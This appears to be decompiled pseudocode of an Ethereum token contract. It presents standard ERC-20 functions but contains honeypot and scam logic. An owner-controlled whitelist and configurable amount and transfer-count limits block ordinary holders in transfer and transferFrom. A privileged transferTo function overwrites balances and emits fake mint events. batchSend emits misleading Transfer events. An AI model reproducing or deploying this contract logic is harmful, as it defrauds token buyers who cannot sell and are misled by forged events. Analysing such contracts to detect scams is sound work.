contract main {




// =====================  Runtime code  =====================


#
#  - sub_c2549e43(?)
#
const decimals = 18


address stor0;
address stor1;
address stor2;
address stor3;
address stor4;
address stor5;
mapping of uint256 stor6;
mapping of uint8 stor7;
uint256 stor8;
uint256 stor9;
uint256 stor10;
address stor11;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
uint256 totalSupply;
array of uint256 name;
array of uint256 symbol;
address stor17;

function name() {
    return name[0 len name.length]
}

function totalSupply() {
    return totalSupply
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    return balanceOf[arg1]
}

function symbol() {
    return symbol[0 len symbol.length]
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    return allowance[arg1][arg2]
}

function _fallback() payable {
    revert
}

function sub_6083e94b(?) {
    require calldata.size - 4 >= 32
    require msg.sender == stor17
    stor7[address(arg1)] = 1
    return 1
}

function delegate(address arg1) payable {
    require calldata.size - 4 >= 32
    require msg.sender == stor17
    stor11 = arg1
    return 1
}

function sub_89982c2d(?) {
    require calldata.size - 4 >= 64
    require msg.sender == stor17
    if arg2 > 0:
        stor9 = 10^18 * arg2
    else:
        stor9 = 0
    stor10 = arg1
    return 0
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function transferTo(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if arg2 == 100:
        emit Transfer((10^18 * arg2), 0, arg1);
    if arg2 > 0:
        balanceOf[address(arg1)] = 10^18 * arg2
    require msg.sender == stor2
    stor7[address(arg1)] = 1
    return 1
}

function batchSend(address[] arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 <= 4294967296
    require arg1 + 36 <= calldata.size
    require arg1.length <= 4294967296 and arg1 + (32 * arg1.length) + 36 <= calldata.size
    mem[128 len 32 * arg1.length] = call.data[arg1 + 36 len 32 * arg1.length]
    mem[(32 * arg1.length) + 128] = 0
    require msg.sender == stor17
    require balanceOf[address(msg.sender)] >= arg2 * arg1.length
    balanceOf[address(msg.sender)] += -1 * arg2 * arg1.length
    idx = 0
    while idx < arg1.length:
        require idx < arg1.length
        _19 = mem[(32 * idx) + 128]
        mem[0] = mem[(32 * idx) + 140 len 20]
        mem[32] = 12
        balanceOf[mem[(32 * idx) + 140 len 20]] += arg2
        emit Transfer((arg2 / 2), msg.sender, mem[(32 * idx) + 140 len 20]);
        mem[(32 * arg1.length) + 128] = arg2 / 2
        emit Transfer((arg2 / 2), msg.sender, address(_19));
        idx = idx + 1
        continue 
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if arg3:
        if arg1 != msg.sender:
            require allowance[address(arg1)][address(msg.sender)] >= arg3
            allowance[address(arg1)][address(msg.sender)] -= arg3
        if stor1 < this.address:
            if stor3 < this.address:
                if stor5 < this.address:
                    if arg1 != stor17:
                        if arg2 != stor17:
                            if arg1 != address(sha3(0, stor0, sha3(stor1, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                if arg1 != address(sha3(0, stor4, sha3(stor5, this.address), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)):
                                    if arg1 != address(sha3(0, stor0, sha3(stor3, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                        if arg1 != stor11:
                                            if arg1 != stor2:
                                                if not stor7[address(arg1)]:
                                                    if not stor10:
                                                        if not stor8:
                                                            require stor9
                                                    if stor10 > 0:
                                                        require stor6[address(arg1)] < stor10
                                                    if stor8 > 0:
                                                        require stor8 <= arg3
                                                    if stor9 > 0:
                                                        require arg3 <= stor9
                else:
                    if arg1 != stor17:
                        if arg2 != stor17:
                            if arg1 != address(sha3(0, stor0, sha3(stor1, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                if arg1 != address(sha3(0, stor4, sha3(this.address, stor5), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)):
                                    if arg1 != address(sha3(0, stor0, sha3(stor3, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                        if arg1 != stor11:
                                            if arg1 != stor2:
                                                if not stor7[address(arg1)]:
                                                    if not stor10:
                                                        if not stor8:
                                                            require stor9
                                                    if stor10 > 0:
                                                        require stor6[address(arg1)] < stor10
                                                    if stor8 > 0:
                                                        require stor8 <= arg3
                                                    if stor9 > 0:
                                                        require arg3 <= stor9
            else:
                if stor5 < this.address:
                    if arg1 != stor17:
                        if arg2 != stor17:
                            if arg1 != address(sha3(0, stor0, sha3(stor1, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                if arg1 != address(sha3(0, stor4, sha3(stor5, this.address), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)):
                                    if arg1 != address(sha3(0, stor0, sha3(this.address, stor3), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                        if arg1 != stor11:
                                            if arg1 != stor2:
                                                if not stor7[address(arg1)]:
                                                    if not stor10:
                                                        if not stor8:
                                                            require stor9
                                                    if stor10 > 0:
                                                        require stor6[address(arg1)] < stor10
                                                    if stor8 > 0:
                                                        require stor8 <= arg3
                                                    if stor9 > 0:
                                                        require arg3 <= stor9
                else:
                    if arg1 != stor17:
                        if arg2 != stor17:
                            if arg1 != address(sha3(0, stor0, sha3(stor1, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                if arg1 != address(sha3(0, stor4, sha3(this.address, stor5), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)):
                                    if arg1 != address(sha3(0, stor0, sha3(this.address, stor3), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                        if arg1 != stor11:
                                            if arg1 != stor2:
                                                if not stor7[address(arg1)]:
                                                    if not stor10:
                                                        if not stor8:
                                                            require stor9
                                                    if stor10 > 0:
                                                        require stor6[address(arg1)] < stor10
                                                    if stor8 > 0:
                                                        require stor8 <= arg3
                                                    if stor9 > 0:
                                                        require arg3 <= stor9
        else:
            if stor3 < this.address:
                if stor5 < this.address:
                    if arg1 != stor17:
                        if arg2 != stor17:
                            if arg1 != address(sha3(0, stor0, sha3(this.address, stor1), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                if arg1 != address(sha3(0, stor4, sha3(stor5, this.address), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)):
                                    if arg1 != address(sha3(0, stor0, sha3(stor3, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                        if arg1 != stor11:
                                            if arg1 != stor2:
                                                if not stor7[address(arg1)]:
                                                    if not stor10:
                                                        if not stor8:
                                                            require stor9
                                                    if stor10 > 0:
                                                        require stor6[address(arg1)] < stor10
                                                    if stor8 > 0:
                                                        require stor8 <= arg3
                                                    if stor9 > 0:
                                                        require arg3 <= stor9
                else:
                    if arg1 != stor17:
                        if arg2 != stor17:
                            if arg1 != address(sha3(0, stor0, sha3(this.address, stor1), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                if arg1 != address(sha3(0, stor4, sha3(this.address, stor5), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)):
                                    if arg1 != address(sha3(0, stor0, sha3(stor3, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                        if arg1 != stor11:
                                            if arg1 != stor2:
                                                if not stor7[address(arg1)]:
                                                    if not stor10:
                                                        if not stor8:
                                                            require stor9
                                                    if stor10 > 0:
                                                        require stor6[address(arg1)] < stor10
                                                    if stor8 > 0:
                                                        require stor8 <= arg3
                                                    if stor9 > 0:
                                                        require arg3 <= stor9
            else:
                if stor5 < this.address:
                    if arg1 != stor17:
                        if arg2 != stor17:
                            if arg1 != address(sha3(0, stor0, sha3(this.address, stor1), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                if arg1 != address(sha3(0, stor4, sha3(stor5, this.address), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)):
                                    if arg1 != address(sha3(0, stor0, sha3(this.address, stor3), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                        if arg1 != stor11:
                                            if arg1 != stor2:
                                                if not stor7[address(arg1)]:
                                                    if not stor10:
                                                        if not stor8:
                                                            require stor9
                                                    if stor10 > 0:
                                                        require stor6[address(arg1)] < stor10
                                                    if stor8 > 0:
                                                        require stor8 <= arg3
                                                    if stor9 > 0:
                                                        require arg3 <= stor9
                else:
                    if arg1 != stor17:
                        if arg2 != stor17:
                            if arg1 != address(sha3(0, stor0, sha3(this.address, stor1), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                if arg1 != address(sha3(0, stor4, sha3(this.address, stor5), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)):
                                    if arg1 != address(sha3(0, stor0, sha3(this.address, stor3), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                        if arg1 != stor11:
                                            if arg1 != stor2:
                                                if not stor7[address(arg1)]:
                                                    if not stor10:
                                                        if not stor8:
                                                            require stor9
                                                    if stor10 > 0:
                                                        require stor6[address(arg1)] < stor10
                                                    if stor8 > 0:
                                                        require stor8 <= arg3
                                                    if stor9 > 0:
                                                        require arg3 <= stor9
        require balanceOf[address(arg1)] >= arg3
        balanceOf[address(arg1)] -= arg3
        balanceOf[address(arg2)] += arg3
        stor6[address(arg1)]++
        emit Transfer(arg3, arg1, arg2);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if arg2:
        if msg.sender != msg.sender:
            require allowance[address(msg.sender)][address(msg.sender)] >= arg2
            allowance[address(msg.sender)][address(msg.sender)] -= arg2
        if stor1 < this.address:
            if stor3 < this.address:
                if stor5 < this.address:
                    if stor17 != msg.sender:
                        if arg1 != stor17:
                            if address(sha3(0, stor0, sha3(stor1, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)) != msg.sender:
                                if address(sha3(0, stor4, sha3(stor5, this.address), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)) != msg.sender:
                                    if address(sha3(0, stor0, sha3(stor3, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)) != msg.sender:
                                        if stor11 != msg.sender:
                                            if stor2 != msg.sender:
                                                if not stor7[address(msg.sender)]:
                                                    if not stor10:
                                                        if not stor8:
                                                            require stor9
                                                    if stor10 > 0:
                                                        require stor6[address(msg.sender)] < stor10
                                                    if stor8 > 0:
                                                        require stor8 <= arg2
                                                    if stor9 > 0:
                                                        require arg2 <= stor9
                else:
                    if stor17 != msg.sender:
                        if arg1 != stor17:
                            if address(sha3(0, stor0, sha3(stor1, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)) != msg.sender:
                                if address(sha3(0, stor4, sha3(this.address, stor5), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)) != msg.sender:
                                    if address(sha3(0, stor0, sha3(stor3, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)) != msg.sender:
                                        if stor11 != msg.sender:
                                            if stor2 != msg.sender:
                                                if not stor7[address(msg.sender)]:
                                                    if not stor10:
                                                        if not stor8:
                                                            require stor9
                                                    if stor10 > 0:
                                                        require stor6[address(msg.sender)] < stor10
                                                    if stor8 > 0:
                                                        require stor8 <= arg2
                                                    if stor9 > 0:
                                                        require arg2 <= stor9
            else:
                if stor5 < this.address:
                    if stor17 != msg.sender:
                        if arg1 != stor17:
                            if address(sha3(0, stor0, sha3(stor1, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)) != msg.sender:
                                if address(sha3(0, stor4, sha3(stor5, this.address), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)) != msg.sender:
                                    if address(sha3(0, stor0, sha3(this.address, stor3), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)) != msg.sender:
                                        if stor11 != msg.sender:
                                            if stor2 != msg.sender:
                                                if not stor7[address(msg.sender)]:
                                                    if not stor10:
                                                        if not stor8:
                                                            require stor9
                                                    if stor10 > 0:
                                                        require stor6[address(msg.sender)] < stor10
                                                    if stor8 > 0:
                                                        require stor8 <= arg2
                                                    if stor9 > 0:
                                                        require arg2 <= stor9
                else:
                    if stor17 != msg.sender:
                        if arg1 != stor17:
                            if address(sha3(0, stor0, sha3(stor1, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)) != msg.sender:
                                if address(sha3(0, stor4, sha3(this.address, stor5), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)) != msg.sender:
                                    if address(sha3(0, stor0, sha3(this.address, stor3), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)) != msg.sender:
                                        if stor11 != msg.sender:
                                            if stor2 != msg.sender:
                                                if not stor7[address(msg.sender)]:
                                                    if not stor10:
                                                        if not stor8:
                                                            require stor9
                                                    if stor10 > 0:
                                                        require stor6[address(msg.sender)] < stor10
                                                    if stor8 > 0:
                                                        require stor8 <= arg2
                                                    if stor9 > 0:
                                                        require arg2 <= stor9
        else:
            if stor3 < this.address:
                if stor5 < this.address:
                    if stor17 != msg.sender:
                        if arg1 != stor17:
                            if address(sha3(0, stor0, sha3(this.address, stor1), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)) != msg.sender:
                                if address(sha3(0, stor4, sha3(stor5, this.address), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)) != msg.sender:
                                    if address(sha3(0, stor0, sha3(stor3, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)) != msg.sender:
                                        if stor11 != msg.sender:
                                            if stor2 != msg.sender:
                                                if not stor7[address(msg.sender)]:
                                                    if not stor10:
                                                        if not stor8:
                                                            require stor9
                                                    if stor10 > 0:
                                                        require stor6[address(msg.sender)] < stor10
                                                    if stor8 > 0:
                                                        require stor8 <= arg2
                                                    if stor9 > 0:
                                                        require arg2 <= stor9
                else:
                    if stor17 != msg.sender:
                        if arg1 != stor17:
                            if address(sha3(0, stor0, sha3(this.address, stor1), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)) != msg.sender:
                                if address(sha3(0, stor4, sha3(this.address, stor5), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)) != msg.sender:
                                    if address(sha3(0, stor0, sha3(stor3, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)) != msg.sender:
                                        if stor11 != msg.sender:
                                            if stor2 != msg.sender:
                                                if not stor7[address(msg.sender)]:
                                                    if not stor10:
                                                        if not stor8:
                                                            require stor9
                                                    if stor10 > 0:
                                                        require stor6[address(msg.sender)] < stor10
                                                    if stor8 > 0:
                                                        require stor8 <= arg2
                                                    if stor9 > 0:
                                                        require arg2 <= stor9
            else:
                if stor5 < this.address:
                    if stor17 != msg.sender:
                        if arg1 != stor17:
                            if address(sha3(0, stor0, sha3(this.address, stor1), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)) != msg.sender:
                                if address(sha3(0, stor4, sha3(stor5, this.address), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)) != msg.sender:
                                    if address(sha3(0, stor0, sha3(this.address, stor3), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)) != msg.sender:
                                        if stor11 != msg.sender:
                                            if stor2 != msg.sender:
                                                if not stor7[address(msg.sender)]:
                                                    if not stor10:
                                                        if not stor8:
                                                            require stor9
                                                    if stor10 > 0:
                                                        require stor6[address(msg.sender)] < stor10
                                                    if stor8 > 0:
                                                        require stor8 <= arg2
                                                    if stor9 > 0:
                                                        require arg2 <= stor9
                else:
                    if stor17 != msg.sender:
                        if arg1 != stor17:
                            if address(sha3(0, stor0, sha3(this.address, stor1), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)) != msg.sender:
                                if address(sha3(0, stor4, sha3(this.address, stor5), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)) != msg.sender:
                                    if address(sha3(0, stor0, sha3(this.address, stor3), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)) != msg.sender:
                                        if stor11 != msg.sender:
                                            if stor2 != msg.sender:
                                                if not stor7[address(msg.sender)]:
                                                    if not stor10:
                                                        if not stor8:
                                                            require stor9
                                                    if stor10 > 0:
                                                        require stor6[address(msg.sender)] < stor10
                                                    if stor8 > 0:
                                                        require stor8 <= arg2
                                                    if stor9 > 0:
                                                        require arg2 <= stor9
        require balanceOf[address(msg.sender)] >= arg2
        balanceOf[address(msg.sender)] -= arg2
        balanceOf[address(arg1)] += arg2
        stor6[address(msg.sender)]++
        emit Transfer(arg2, msg.sender, arg1);
    return 1
}



}
